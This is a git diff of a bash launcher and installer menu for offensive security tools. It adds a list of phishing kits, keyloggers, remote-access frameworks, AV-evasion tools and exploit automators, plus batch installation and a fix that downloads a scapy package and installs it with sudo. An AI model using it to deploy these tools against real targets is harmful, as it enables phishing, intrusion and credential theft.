@@ -1,10 +1,12 @@
 #! /bin/bash
-VERSION=2.1.4
+
+# set -x
+VERSION=2.1.5
 #Number of tools with keyboard shortcut support
-HOWMANYTOOLS=47
+HOWMANYTOOLS=53
 BACKL="0"
-DONATIONS=5
-LATESTCHANGELOGLINES=30
+DONATIONS=10
+LATESTCHANGELOGLINES=26
 cd
 #############DEFAULTS###############
 function defaults_l
@@ -20,6 +22,15 @@ function defaults_l
 	then
 		mkdir "$KSPATH"
 	fi
+#wififb file
+	wififbfile=""$LPATH"/wififb.txt"
+	wififbfileall=""$LPATH"/wififball.txt"
+	wififbpassfile=""$LPATH"/wififbpasswords.txt"
+	wififbpassfileall=""$LPATH"/wififbpasswordsall.txt"
+	export wififbfile 
+	export wififbfileall
+	export wififbpassfile
+	export wififbpassfileall
 #ALFA SUPPORT SETTING
 	if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
 	then
@@ -68,6 +79,16 @@ function defaults_l
 	else
 		COL="$RS"
 	fi
+#tools
+toolarray=(
+"fluxion" "sniffer" "wifite" "wifiphisher" "morpheus" "osrframework" "hakku" "trity" "cupp" "dracnmap" "fern" "kickthemout" "ghostphisher" "theeye" "xerxes"
+"mdk3" "katana" "airgeddon" "4nonimizer" "beelogger" "ezsploit" "pupy" "zirikatu" "wifiautopwner" "bully" "anonsurf" "anonym8" "thefatrat" "angryip" "sniper"
+"recondog" "redhawk" "winpayloads" "chaos" "routersploit" "infoga" "nwatch" "eternalscanner" "eaphammer" "dagon" "lalin" "knockmail" "kwetza" "ngrok" "netdiscover"
+"websploit" "openvas" "shellter" "geany" "bleachbit" "vmr" "hashbuster" "findsploit" "howdoi" "operative" "netattack2" "koadic" "empire" "meterpreter_paranoid_mode"
+"dropit_frmw" "wifi_pumpkin" "veil" "leviathan" "fake_image" "avet" "gloom" "arcanus" "msfpc" "morphhta" "lfi" "unibyav" "demiguise" "dkmc" "sechub" "beef" "mitmf"
+"fsociety" "arp_scan" "netool" "sqlmap" "patator" "zeus" "evil_droid" "nosqlmap" "eggshell" "zerodoor" "cromos" "yuki-chan" "socialfish" "autosploit" "blazy"
+"striker" "hyprpulse" "instaburst" "instagram-py" "datasploit" "sitebroker" "enigma"
+)
 #setting frequent stings
 	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
 	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
@@ -89,10 +110,11 @@ function local_ips()
 	iffile=""$LPATH"/iftemp.txt"
 	#passing an interface if any
 	LF="$1"
+	GREPP=$(ifconfig)
 	if [[ "$LF" = "" ]]
 	then
 		echo -e ""$BS"Local IPs"$CE": "
-		TEST=$(ifconfig | grep "$ETH:")
+		TEST=$(echo "$GREPP" | grep "$ETH:")
 		n=0
 		if [[ $TEST != "" ]]
 		then
@@ -105,7 +127,7 @@ function local_ips()
 				n=1
 			fi
 		fi
-		TEST=$(ifconfig | grep "$WLANN:")
+		TEST=$(echo "$GREPP" | grep "$WLANN:")
 		if [[ $TEST != "" ]]
 		then
 			ifconfig $WLANN > $iffile
@@ -117,7 +139,7 @@ function local_ips()
 				n=1
 			fi
 		fi
-		TEST=$(ifconfig | grep "$WLANNM:")
+		TEST=$(echo "$GREPP" | grep "$WLANNM:")
 		if [[ $TEST != "" ]]
 		then
 			ifconfig $WLANNM > $iffile
@@ -136,7 +158,7 @@ function local_ips()
 		echo -e ""
 		find_gateways
 	else
-		TEST=$(ifconfig | grep "$LF:")
+		TEST=$(echo "$GREPP" | grep "$LF:")
 		if [[ $TEST != "" ]]
 		then
 			ifconfig $LF > $iffile
@@ -670,7 +692,7 @@ function listshortcuts
 	then
 		TITLE="Angry_IP_Scanner"
 		NAMECD=" "
-		KSSET="ipscan & disown"
+		KSSET="ipscan"
 	#~ elif [[ "$nn" = "23" ]]
 	#~ then
 		#~ TITLE="Sniper"
@@ -801,290 +823,468 @@ function listshortcuts
 		TITLE="NoSQLMap"
 		NAMECD="cd /root/NoSQLMap"
 		KSSET="python nosqlmap.py"
+	elif [[ "$nn" = "48" ]]
+	then
+		TITLE="EggShell"
+		NAMECD="cd /root/EggShell"
+		KSSET="python eggshell.py"
+	elif [[ "$nn" = "49" ]]
+	then
+		TITLE="Zerodoor"
+		NAMECD="cd /root/Zerodoor"
+		KSSET="python zerodoor.py"
+	elif [[ "$nn" = "50" ]]
+	then
+		TITLE="AutoSploit"
+		NAMECD="cd /root/AutoSploit"
+		KSSET="python autosploit.py"
+	elif [[ "$nn" = "51" ]]
+	then
+		TITLE="Enigma"
+		NAMECD="cd /root/Enigma"
+		KSSET="python enigma.py"
+	elif [[ "$nn" = "52" ]]
+	then
+		TITLE="SocialFish"
+		NAMECD="cd /root/SocialFish"
+		KSSET="python SocialFish.py"
+	elif [[ "$nn" = "53" ]]
+	then
+		TITLE="Yuki-Chan-The-Auto-Pentest"
+		NAMECD="cd /root/Yuki-Chan-The-Auto-Pentest"
+		KSSET="./yuki.sh"
 	fi
 }
 function reinstall_tools
 {
 while true
 do
-	cd
 	clear
-	TERMINALTITLE="INSTALL/REINSTALL A TOOL"
-	dash_calc
-	printf '\033]2;INSTALL/REINSTALL A TOOL\a'
-	echo -e "Select a tool to install/reinstall"
-	echo -e " "$YS"1"$CE") Fluxion      "$YS"21"$CE") 4nonimizer    "$YS"41"$CE") Infoga           "$YS"61"$CE") Wifi-Pumpkin"
-	echo -e ""$YS" 2"$CE") Wifite       "$YS"22"$CE") Openvas       "$YS"42"$CE") nWatch           "$YS"62"$CE") Veil-Framework"
-	echo -e ""$YS" 3"$CE") Wifiphisher  "$YS"23"$CE") BeeLogger     "$YS"43"$CE") Eternal scanner  "$YS"63"$CE") Leviathan"
-	echo -e ""$YS" 4"$CE") Zatacker     "$YS"24"$CE") Ezsploit      "$YS"44"$CE") Eaphammer        "$YS"64"$CE") FakeImageExploiter"
-	echo -e ""$YS" 5"$CE") Morpheus     "$YS"25"$CE") Pupy          "$YS"45"$CE") Dagon            "$YS"65"$CE") Avet"
-	echo -e ""$YS" 6"$CE") Osrfconsole  "$YS"26"$CE") Zirikatu      "$YS"46"$CE") Lalin            "$YS"66"$CE") Gloom"
-	echo -e ""$YS" 7"$CE") Hakku        "$YS"27"$CE") WiFi-autopwner"$YS"47"$CE") Knockmail        "$YS"67"$CE") Arcanus"
-	echo -e ""$YS" 8"$CE") Trity        "$YS"28"$CE") Bully         "$YS"48"$CE") Kwetza           "$YS"68"$CE") MSFPC"
-	echo -e ""$YS" 9"$CE") Cupp         "$YS"29"$CE") Anonsurf      "$YS"49"$CE") Ngrok            "$YS"69"$CE") MorphHTA"
-	echo -e ""$YS"10"$CE") Dracnmap     "$YS"30"$CE") Anonym8       "$YS"50"$CE") Bleachbit        "$YS"70"$CE") LFISuite"
-	echo -e ""$YS"11"$CE") Fern         "$YS"31"$CE") TheFatRat     "$YS"51"$CE") Vmr mdk          "$YS"71"$CE") UniByAv"
-	echo -e ""$YS"12"$CE") Netdiscover  "$YS"32"$CE") Angry IP      "$YS"52"$CE") Hash Buster      "$YS"72"$CE") Demiguise"
-	echo -e ""$YS"13"$CE") KickThemOut  "$YS"33"$CE") Sniper        "$YS"53"$CE") Findsploit       "$YS"73"$CE") Dkmc"
-	echo -e ""$YS"14"$CE") Ghost-Phisher"$YS"34"$CE") ReconDog      "$YS"54"$CE") Howdoi           "$YS"74"$CE") MITMf"
-	echo -e ""$YS"15"$CE") The Eye      "$YS"35"$CE") RED HAWK      "$YS"55"$CE") Operative-frmwork"$YS"75"$CE") Netool-toolkit"
-	echo -e ""$YS"16"$CE") Xerxes       "$YS"36"$CE") WinPayloads   "$YS"56"$CE") Netattack2       "$YS"76"$CE") Patator"
-	echo -e ""$YS"17"$CE") Mdk3-master  "$YS"37"$CE") Shellter      "$YS"57"$CE") Koadic           "$YS"77"$CE") Evil-Droid"
-	echo -e ""$YS"18"$CE") Katana       "$YS"38"$CE") CHAOS         "$YS"58"$CE") Empire           "$YS"78"$CE") NoSQLMap"
-	echo -e ""$YS"19"$CE") Airgeddon    "$YS"39"$CE") Routersploit  "$YS"59"$CE") Meterpr.-Paranoid"
-	echo -e ""$YS"20"$CE") Websploit    "$YS"40"$CE") Geany         "$YS"60"$CE") Dr0p1t"
-	echo -e ""$YS" b"$CE") Go back"
-	echo -e ""$YS" 0"$CE") Exit"
-	echo -e "Choose: "
-	read REIN
-	clear
-	if [[ "$REIN" = "1" ]]
-	then
-		install_fluxion		
-	elif [[ "$REIN" = "2" ]]
-	then
-		install_wifite
-	elif [[ "$REIN" = "3" ]]
-	then
-		install_wifiphisher
-	elif [[ "$REIN" = "4" ]]
-	then
-		install_zatacker
-	elif [[ "$REIN" = "5" ]]
-	then
-		install_morpheus
-	elif [[ "$REIN" = "6" ]]
-	then
-		install_osrframework			
-	elif [[ "$REIN" = "7" ]]
-	then
-		install_hakku
-	elif [[ "$REIN" = "8" ]]
-	then
-		install_trity
-	elif [[ "$REIN" = "9" ]]
-	then
-		install_cupp
-	elif [[ "$REIN" = "10" ]]
-	then
-		install_dracnmap
-	elif [[ "$REIN" = "11" ]]
-	then
-		install_fern
-	elif [[ "$REIN" = "12" ]]
-	then
-		install_netdiscover		
-	elif [[ "$REIN" = "13" ]]
-	then
-		install_kickthemout
-	elif [[ "$REIN" = "14" ]]
-	then
-		install_ghostphisher
-	elif [[ "$REIN" = "15" ]]
-	then
-		install_theeye
-	elif [[ "$REIN" = "16" ]]
-	then
-		install_xerxes
-	elif [[ "$REIN" = "17" ]]
-	then
-		install_mdk3
-	elif [[ "$REIN" = "18" ]]
-	then
-		install_katana
-	elif [[ "$REIN" = "19" ]]
-	then
-		install_airgeddon
-	elif [[ "$REIN" = "20" ]]
-	then
-		install_websploit
-	elif [[ "$REIN" = "21" ]]
-	then
-		install_4nonimizer
-	elif [[ "$REIN" = "22" ]]
-	then
-		install_openvas
-	elif [[ "$REIN" = "23" ]]
-	then
-		install_beelogger
-	elif [[ "$REIN" = "24" ]]
-	then
-		install_ezsploit
-	elif [[ "$REIN" = "25" ]]
-	then
-		install_pupy
-	elif [[ "$REIN" = "26" ]]
-	then
-		install_zirikatu
-	elif [[ "$REIN" = "27" ]]
-	then
-		install_wifiautopwner
-	elif [[ "$REIN" = "28" ]]
-	then
-		install_bully
-	elif [[ "$REIN" = "29" ]]
-	then
-		install_anonsurf
-	elif [[ "$REIN" = "30" ]]
-	then
-		install_anonym8
-	elif [[ "$REIN" = "31" ]]
-	then	
-		install_thefatrat
-	elif [[ "$REIN" = "32" ]]
-	then
-		install_angryip
-	elif [[ "$REIN" = "33" ]]
-	then
-		install_sniper
-	elif [[ "$REIN" = "34" ]]
-	then
-		install_recondog
-	elif [[ "$REIN" = "35" ]]
-	then
-		install_redhawk
-	elif [[ "$REIN" = "36" ]]
-	then
-		install_winpayloads
-	elif [[ "$REIN" = "37" ]]
-	then
-		install_shellter
-	elif [[ "$REIN" = "38" ]]
-	then
-		install_chaos
-	elif [[ "$REIN" = "39" ]]
-	then
-		install_routersploit
-	elif [[ "$REIN" = "40" ]]
-	then
-		install_geany
-	elif [[ "$REIN" = "41" ]]
-	then
-		install_infoga
-	elif [[ "$REIN" = "42" ]]
-	then
-		install_nwatch
-	elif [[ "$REIN" = "43" ]]
-	then
-		install_eternalscanner
-	elif [[ "$REIN" = "44" ]]
-	then
-		install_eaphammer
-	elif [[ "$REIN" = "45" ]]
-	then
-		install_dagon
-	elif [[ "$REIN" = "46" ]]
-	then
-		install_lalin
-	elif [[ "$REIN" = "47" ]]
-	then
-		install_knockmail
-	elif [[ "$REIN" = "48" ]]
-	then
-		install_kwetza
-	elif [[ "$REIN" = "49" ]]
-	then
-		install_ngrok
-	elif [[ "$REIN" = "50" ]]
-	then
-		install_bleachbit
-	elif [[ "$REIN" = "51" ]]
-	then
-		install_vmr
-	elif [[ "$REIN" = "52" ]]
-	then
-		install_hashbuster
-	elif [[ "$REIN" = "53" ]]
-	then
-		install_findsploit
-	elif [[ "$REIN" = "54" ]]
-	then
-		install_howdoi
-	elif [[ "$REIN" = "55" ]]
-	then
-		install_operative
-	elif [[ "$REIN" = "56" ]]
-	then
-		install_netattack2
-	elif [[ "$REIN" = "57" ]]
-	then
-		install_koadic
-	elif [[ "$REIN" = "58" ]]
-	then
-		install_empire
-	elif [[ "$REIN" = "59" ]]
-	then
-		install_meterpreter_paranoid_mode
-	elif [[ "$REIN" = "60" ]]
-	then
-		install_dropit_frmw
-	elif [[ "$REIN" = "61" ]]
-	then
-		install_wifi_pumpkin
-	elif [[ "$REIN" = "62" ]]
-	then
-		install_veil
-	elif [[ "$REIN" = "63" ]]
-	then
-		install_leviathan
-	elif [[ "$REIN" = "64" ]]
-	then
-		install_fake_image
-	elif [[ "$REIN" = "65" ]]
-	then
-		install_avet
-	elif [[ "$REIN" = "66" ]]
-	then
-		install_gloom
-	elif [[ "$REIN" = "67" ]]
-	then
-		install_arcanus
-	elif [[ "$REIN" = "68" ]]
-	then
-		install_msfpc
-	elif [[ "$REIN" = "69" ]]
-	then
-		install_morphhta
-	elif [[ "$REIN" = "70" ]]
-	then
-		install_lfi
-	elif [[ "$REIN" = "71" ]]
-	then
-		install_unibyav
-	elif [[ "$REIN" = "72" ]]
-	then
-		install_demiguise
-	elif [[ "$REIN" = "73" ]]
-	then
-		install_dkmc
-	elif [[ "$REIN" = "74" ]]
-	then
-		install_mitmf
-	elif [[ "$REIN" = "75" ]]
-	then
-		install_netool
-	elif [[ "$REIN" = "76" ]]
-	then
-		install_patator
-	elif [[ "$REIN" = "77" ]]
-	then
-		install_evil_droid
-	elif [[ "$REIN" = "78" ]]
-	then
-		install_nosqlmap
-	elif [[ "$REIN" = "back" || "$REIN" = "b" ]]
+		#counting the tools
+	TOOLSNUM=${#toolarray[@]}
+	HALFTOOLS=$((TOOLSNUM/2+1))
+		#number for 2ond column
+	CLMN2=$((HALFTOOLS+1))
+	CLMN2TOOLS=$((TOOLSNUM/2+1))
+		#alphabetically sort tools
+	readarray -t toolarraysorted < <(for a in "${toolarray[@]}"; do echo "$a"; done | sort)
+	echo -e ""$BS"Select out of $TOOLSNUM tools to install/update:"$CE""
+		#set colour of selected
+	SEL="$YS"
+	n=0
+	while [[ "$n" -lt "$HALFTOOLS" ]]
+	do
+			#start echoing from number 1 instead of number 0(fist array)
+		k=$((n+1))
+			#fixing the spaces to sort output better
+		if [[ "$k" -le 9 ]]
+		then
+			m="  "$k""
+		elif [[ "$k" -ge 10 && "$k" -le 99 ]]
+		then
+			m=" "$k""
+		else
+			m="$k"
+		fi
+			#calculating how many spaces needed for correct output
+		size=${#toolarraysorted["$n"]}
+		calc=$(( 35-size ))
+		numcalc=1
+		SPACES=""
+		while [[ "$numcalc" != "$calc" ]]
+		do
+			SPACES=""${SPACES}" "
+			numcalc=$(( numcalc+1 ))
+		done
+		COL1=""
+		COL2=""
+		if [[ "${selected["$n"]}" == 1 ]]
+		then
+			COL1="$SEL"
+		fi
+		if [[ "${selected["$CLMN2TOOLS"]}" == 1 ]]
+		then
+			COL2="$SEL"
+		fi
+		if [[ "${toolarraysorted["$CLMN2TOOLS"]}" == "" ]]
+		then
+			echo -e ""$YS"${m}"$CE") "$COL1""${toolarraysorted["$n"]}""$CE""
+		else
+			echo -e ""$YS"${m}"$CE") "$COL1""${toolarraysorted["$n"]}""$CE"${SPACES}"$YS""$CLMN2""$CE") "$COL2""${toolarraysorted["$CLMN2TOOLS"]}""$CE""
+		fi
+		n=$((n+1))
+		CLMN2=$((CLMN2+1))
+		CLMN2TOOLS=$((CLMN2TOOLS+1))
+	done
+	echo -e "  "$YS"b"$CE") Go back"
+	echo -e "  "$YS"s"$CE") Start installing selected tools"
+	echo -e "  "$YS"r"$CE") Reset selection"
+	if [[ "$NOCONFIRM" == 1 ]]
+	then
+		echo -e "  "$YS"n"$CE") "$YS"No confirmation"$CE""
+	else
+		echo -e "  "$YS"n"$CE") No confirmation"
+	fi
+	echo -e "  "$YS"0"$CE") Exit"
+	echo -e "  Choose: "
+	read ST
+	if [[ "$ST" == "b" || "$ST" == "back" ]]
 	then
 		clear
 		break
-	elif [[ "$REIN" = "00" ]]
-	then	
-		exec bash "$0"
-	elif [[ "$REIN" = "0" ]]
+	elif [[ "$ST" == 0 ]]
 	then
-		clear
 		exit
+	elif [[ "$ST" == 00 ]]
+	then
+		exec bash $0
+	elif [[ "$ST" == "r" ]]
+	then
+		p=0
+		while [[ "$p" -le "$TOOLSNUM" ]]
+		do
+			selected["$p"]=0
+			p=$((p+1))
+		done
+	elif [[ "$ST" == "s" ]]
+	then
+		z=0
+		HOWMANYSELECTED=0
+		while [[ "$z" -lt "$TOOLSNUM" ]]
+		do
+			if [[ ${selected["$z"]} == 1 ]]
+			then
+				HOWMANYSELECTED=$((HOWMANYSELECTED+1))
+				toolselected["$HOWMANYSELECTED"]=${toolarraysorted["$z"]}
+			fi
+			z=$((z+1))
+		done
+		if [[ "$HOWMANYSELECTED" == 0 ]]
+		then
+			echo -e ""$RS"No tools selected"$CE""
+			sleep 2
+			continue
+		fi
+		j=1
+		while [[ "$j" -le "$HOWMANYSELECTED" ]]
+		do
+			clear
+			echo -e ""$YS"Installing "${toolselected["$j"]}""$CE"("$YS"$j"$CE"/"$YS"$HOWMANYSELECTED"$CE")"
+			sleep 1
+			command="install_"${toolselected["$j"]}""
+			$command
+			j=$((j+1))
+		done
+		p=0
+		while [[ "$p" -le "$TOOLSNUM" ]]
+		do
+			selected["$p"]=0
+			p=$((p+1))
+		done
+		NOCONFIRM=0
+		echo -e "$PAKTGB"
+		$READAK
+	elif [[ "$ST" == "n" ]]
+	then
+		if [[ "$NOCONFIRM" != 1 ]]
+		then
+			NOCONFIRM=1
+		else
+			NOCONFIRM=0
+		fi
+	elif [[ ! "$ST" -ge 1 ]]
+	then
+		continue
+	else
+		STF=$((ST-1))
+		if [[ "${selected["$STF"]}" == 1 ]]
+		then
+			selected["$STF"]=0
+		else
+			selected["$STF"]=1
+		fi
 	fi
-	done
+done
+#~ while true
+#~ do
+	#~ cd
+	#~ clear
+	#~ TERMINALTITLE="INSTALL/REINSTALL A TOOL"
+	#~ dash_calc
+	#~ printf '\033]2;INSTALL/REINSTALL A TOOL\a'
+	#~ echo -e ""$BS"Select a tool to install/reinstall"$CE""
+	#~ echo -e " "$YS"1"$CE") Fluxion      "$YS"21"$CE") 4nonimizer    "$YS"41"$CE") Infoga           "$YS"61"$CE") Wifi-Pumpkin"
+	#~ echo -e ""$YS" 2"$CE") Wifite       "$YS"22"$CE") Openvas       "$YS"42"$CE") nWatch           "$YS"62"$CE") Veil-Framework"
+	#~ echo -e ""$YS" 3"$CE") Wifiphisher  "$YS"23"$CE") BeeLogger     "$YS"43"$CE") Eternal scanner  "$YS"63"$CE") Leviathan"
+	#~ echo -e ""$YS" 4"$CE") Zatacker     "$YS"24"$CE") Ezsploit      "$YS"44"$CE") Eaphammer        "$YS"64"$CE") FakeImageExploiter"
+	#~ echo -e ""$YS" 5"$CE") Morpheus     "$YS"25"$CE") Pupy          "$YS"45"$CE") Dagon            "$YS"65"$CE") Avet"
+	#~ echo -e ""$YS" 6"$CE") Osrfconsole  "$YS"26"$CE") Zirikatu      "$YS"46"$CE") Lalin            "$YS"66"$CE") Gloom"
+	#~ echo -e ""$YS" 7"$CE") Hakku        "$YS"27"$CE") WiFi-autopwner"$YS"47"$CE") Knockmail        "$YS"67"$CE") Arcanus"
+	#~ echo -e ""$YS" 8"$CE") Trity        "$YS"28"$CE") Bully         "$YS"48"$CE") Kwetza           "$YS"68"$CE") MSFPC"
+	#~ echo -e ""$YS" 9"$CE") Cupp         "$YS"29"$CE") Anonsurf      "$YS"49"$CE") Ngrok            "$YS"69"$CE") MorphHTA"
+	#~ echo -e ""$YS"10"$CE") Dracnmap     "$YS"30"$CE") Anonym8       "$YS"50"$CE") Bleachbit        "$YS"70"$CE") LFISuite"
+	#~ echo -e ""$YS"11"$CE") Fern         "$YS"31"$CE") TheFatRat     "$YS"51"$CE") Vmr mdk          "$YS"71"$CE") UniByAv"
+	#~ echo -e ""$YS"12"$CE") Netdiscover  "$YS"32"$CE") Angry IP      "$YS"52"$CE") Hash Buster      "$YS"72"$CE") Demiguise"
+	#~ echo -e ""$YS"13"$CE") KickThemOut  "$YS"33"$CE") Sniper        "$YS"53"$CE") Findsploit       "$YS"73"$CE") Dkmc"
+	#~ echo -e ""$YS"14"$CE") Ghost-Phisher"$YS"34"$CE") ReconDog      "$YS"54"$CE") Howdoi           "$YS"74"$CE") MITMf"
+	#~ echo -e ""$YS"15"$CE") The Eye      "$YS"35"$CE") RED HAWK      "$YS"55"$CE") Operative-frmwork"$YS"75"$CE") Netool-toolkit"
+	#~ echo -e ""$YS"16"$CE") Xerxes       "$YS"36"$CE") WinPayloads   "$YS"56"$CE") Netattack2       "$YS"76"$CE") Patator"
+	#~ echo -e ""$YS"17"$CE") Mdk3-master  "$YS"37"$CE") Shellter      "$YS"57"$CE") Koadic           "$YS"77"$CE") Evil-Droid"
+	#~ echo -e ""$YS"18"$CE") Katana       "$YS"38"$CE") CHAOS         "$YS"58"$CE") Empire           "$YS"78"$CE") NoSQLMap"
+	#~ echo -e ""$YS"19"$CE") Airgeddon    "$YS"39"$CE") Routersploit  "$YS"59"$CE") Meterpr.-Paranoid"
+	#~ echo -e ""$YS"20"$CE") Websploit    "$YS"40"$CE") Geany         "$YS"60"$CE") Dr0p1t"
+	#~ echo -e ""$YS" b"$CE") Go back"
+	#~ echo -e ""$YS" 0"$CE") Exit"
+	#~ echo -e "Choose: "
+	#~ read REIN
+	#~ clear
+	#~ if [[ "$REIN" = "1" ]]
+	#~ then
+		#~ install_fluxion		
+	#~ elif [[ "$REIN" = "2" ]]
+	#~ then
+		#~ install_wifite
+	#~ elif [[ "$REIN" = "3" ]]
+	#~ then
+		#~ install_wifiphisher
+	#~ elif [[ "$REIN" = "4" ]]
+	#~ then
+		#~ install_zatacker
+	#~ elif [[ "$REIN" = "5" ]]
+	#~ then
+		#~ install_morpheus
+	#~ elif [[ "$REIN" = "6" ]]
+	#~ then
+		#~ install_osrframework			
+	#~ elif [[ "$REIN" = "7" ]]
+	#~ then
+		#~ install_hakku
+	#~ elif [[ "$REIN" = "8" ]]
+	#~ then
+		#~ install_trity
+	#~ elif [[ "$REIN" = "9" ]]
+	#~ then
+		#~ install_cupp
+	#~ elif [[ "$REIN" = "10" ]]
+	#~ then
+		#~ install_dracnmap
+	#~ elif [[ "$REIN" = "11" ]]
+	#~ then
+		#~ install_fern
+	#~ elif [[ "$REIN" = "12" ]]
+	#~ then
+		#~ install_netdiscover		
+	#~ elif [[ "$REIN" = "13" ]]
+	#~ then
+		#~ install_kickthemout
+	#~ elif [[ "$REIN" = "14" ]]
+	#~ then
+		#~ install_ghostphisher
+	#~ elif [[ "$REIN" = "15" ]]
+	#~ then
+		#~ install_theeye
+	#~ elif [[ "$REIN" = "16" ]]
+	#~ then
+		#~ install_xerxes
+	#~ elif [[ "$REIN" = "17" ]]
+	#~ then
+		#~ install_mdk3
+	#~ elif [[ "$REIN" = "18" ]]
+	#~ then
+		#~ install_katana
+	#~ elif [[ "$REIN" = "19" ]]
+	#~ then
+		#~ install_airgeddon
+	#~ elif [[ "$REIN" = "20" ]]
+	#~ then
+		#~ install_websploit
+	#~ elif [[ "$REIN" = "21" ]]
+	#~ then
+		#~ install_4nonimizer
+	#~ elif [[ "$REIN" = "22" ]]
+	#~ then
+		#~ install_openvas
+	#~ elif [[ "$REIN" = "23" ]]
+	#~ then
+		#~ install_beelogger
+	#~ elif [[ "$REIN" = "24" ]]
+	#~ then
+		#~ install_ezsploit
+	#~ elif [[ "$REIN" = "25" ]]
+	#~ then
+		#~ install_pupy
+	#~ elif [[ "$REIN" = "26" ]]
+	#~ then
+		#~ install_zirikatu
+	#~ elif [[ "$REIN" = "27" ]]
+	#~ then
+		#~ install_wifiautopwner
+	#~ elif [[ "$REIN" = "28" ]]
+	#~ then
+		#~ install_bully
+	#~ elif [[ "$REIN" = "29" ]]
+	#~ then
+		#~ install_anonsurf
+	#~ elif [[ "$REIN" = "30" ]]
+	#~ then
+		#~ install_anonym8
+	#~ elif [[ "$REIN" = "31" ]]
+	#~ then	
+		#~ install_thefatrat
+	#~ elif [[ "$REIN" = "32" ]]
+	#~ then
+		#~ install_angryip
+	#~ elif [[ "$REIN" = "33" ]]
+	#~ then
+		#~ install_sniper
+	#~ elif [[ "$REIN" = "34" ]]
+	#~ then
+		#~ install_recondog
+	#~ elif [[ "$REIN" = "35" ]]
+	#~ then
+		#~ install_redhawk
+	#~ elif [[ "$REIN" = "36" ]]
+	#~ then
+		#~ install_winpayloads
+	#~ elif [[ "$REIN" = "37" ]]
+	#~ then
+		#~ install_shellter
+	#~ elif [[ "$REIN" = "38" ]]
+	#~ then
+		#~ install_chaos
+	#~ elif [[ "$REIN" = "39" ]]
+	#~ then
+		#~ install_routersploit
+	#~ elif [[ "$REIN" = "40" ]]
+	#~ then
+		#~ install_geany
+	#~ elif [[ "$REIN" = "41" ]]
+	#~ then
+		#~ install_infoga
+	#~ elif [[ "$REIN" = "42" ]]
+	#~ then
+		#~ install_nwatch
+	#~ elif [[ "$REIN" = "43" ]]
+	#~ then
+		#~ install_eternalscanner
+	#~ elif [[ "$REIN" = "44" ]]
+	#~ then
+		#~ install_eaphammer
+	#~ elif [[ "$REIN" = "45" ]]
+	#~ then
+		#~ install_dagon
+	#~ elif [[ "$REIN" = "46" ]]
+	#~ then
+		#~ install_lalin
+	#~ elif [[ "$REIN" = "47" ]]
+	#~ then
+		#~ install_knockmail
+	#~ elif [[ "$REIN" = "48" ]]
+	#~ then
+		#~ install_kwetza
+	#~ elif [[ "$REIN" = "49" ]]
+	#~ then
+		#~ install_ngrok
+	#~ elif [[ "$REIN" = "50" ]]
+	#~ then
+		#~ install_bleachbit
+	#~ elif [[ "$REIN" = "51" ]]
+	#~ then
+		#~ install_vmr
+	#~ elif [[ "$REIN" = "52" ]]
+	#~ then
+		#~ install_hashbuster
+	#~ elif [[ "$REIN" = "53" ]]
+	#~ then
+		#~ install_findsploit
+	#~ elif [[ "$REIN" = "54" ]]
+	#~ then
+		#~ install_howdoi
+	#~ elif [[ "$REIN" = "55" ]]
+	#~ then
+		#~ install_operative
+	#~ elif [[ "$REIN" = "56" ]]
+	#~ then
+		#~ install_netattack2
+	#~ elif [[ "$REIN" = "57" ]]
+	#~ then
+		#~ install_koadic
+	#~ elif [[ "$REIN" = "58" ]]
+	#~ then
+		#~ install_empire
+	#~ elif [[ "$REIN" = "59" ]]
+	#~ then
+		#~ install_meterpreter_paranoid_mode
+	#~ elif [[ "$REIN" = "60" ]]
+	#~ then
+		#~ install_dropit_frmw
+	#~ elif [[ "$REIN" = "61" ]]
+	#~ then
+		#~ install_wifi_pumpkin
+	#~ elif [[ "$REIN" = "62" ]]
+	#~ then
+		#~ install_veil
+	#~ elif [[ "$REIN" = "63" ]]
+	#~ then
+		#~ install_leviathan
+	#~ elif [[ "$REIN" = "64" ]]
+	#~ then
+		#~ install_fake_image
+	#~ elif [[ "$REIN" = "65" ]]
+	#~ then
+		#~ install_avet
+	#~ elif [[ "$REIN" = "66" ]]
+	#~ then
+		#~ install_gloom
+	#~ elif [[ "$REIN" = "67" ]]
+	#~ then
+		#~ install_arcanus
+	#~ elif [[ "$REIN" = "68" ]]
+	#~ then
+		#~ install_msfpc
+	#~ elif [[ "$REIN" = "69" ]]
+	#~ then
+		#~ install_morphhta
+	#~ elif [[ "$REIN" = "70" ]]
+	#~ then
+		#~ install_lfi
+	#~ elif [[ "$REIN" = "71" ]]
+	#~ then
+		#~ install_unibyav
+	#~ elif [[ "$REIN" = "72" ]]
+	#~ then
+		#~ install_demiguise
+	#~ elif [[ "$REIN" = "73" ]]
+	#~ then
+		#~ install_dkmc
+	#~ elif [[ "$REIN" = "74" ]]
+	#~ then
+		#~ install_mitmf
+	#~ elif [[ "$REIN" = "75" ]]
+	#~ then
+		#~ install_netool
+	#~ elif [[ "$REIN" = "76" ]]
+	#~ then
+		#~ install_patator
+	#~ elif [[ "$REIN" = "77" ]]
+	#~ then
+		#~ install_evil_droid
+	#~ elif [[ "$REIN" = "78" ]]
+	#~ then
+		#~ install_nosqlmap
+	#~ elif [[ "$REIN" = "back" || "$REIN" = "b" ]]
+	#~ then
+		#~ clear
+		#~ break
+	#~ elif [[ "$REIN" = "00" ]]
+	#~ then	
+		#~ exec bash "$0"
+	#~ elif [[ "$REIN" = "0" ]]
+	#~ then
+		#~ clear
+		#~ exit
+	#~ fi
+	#~ done
 }
 function errors_menu
 {
@@ -1102,6 +1302,7 @@ echo -e ""$YS" 5"$CE") Error starting apache2 service"
 echo -e ""$YS" 6"$CE") Errors when apt-get update"
 echo -e ""$YS" 7"$CE") Errors when creating a payload with Winpayloads"
 echo -e ""$YS" 8"$CE") Complete fix for apache2 service failed to start"
+echo -e ""$YS" 9"$CE") Cannot capture handshake-pyrit verification always bad"
 echo -e ""$YS" b"$CE") Go back"
 echo -e ""$YS" 0"$CE") EXIT"
 echo -e " Choose: "
@@ -1182,6 +1383,13 @@ then
 	apt-get -y remove nginx-full
 	apt-get -y remove nginx-common
 	apt-get -y autoremove
+	clear
+	echo -e "Error was fixed!"
+	echo -e "$PAKTGB"
+	$READAK
+elif [[ "$ERRS" = "9" ]]
+then
+	wget -O /tmp/scapy2.3.2.tar.gz https://pypi.python.org/packages/6d/72/c055abd32bcd4ee6b36ef8e9ceccc2e242dea9b6c58fdcf2e8fd005f7650/scapy-2.3.2.tar.gz; sudo pip2 install /tmp/scapy2.3.2.tar.gz
 	clear
 	echo -e "Error was fixed!"
 	echo -e "$PAKTGB"
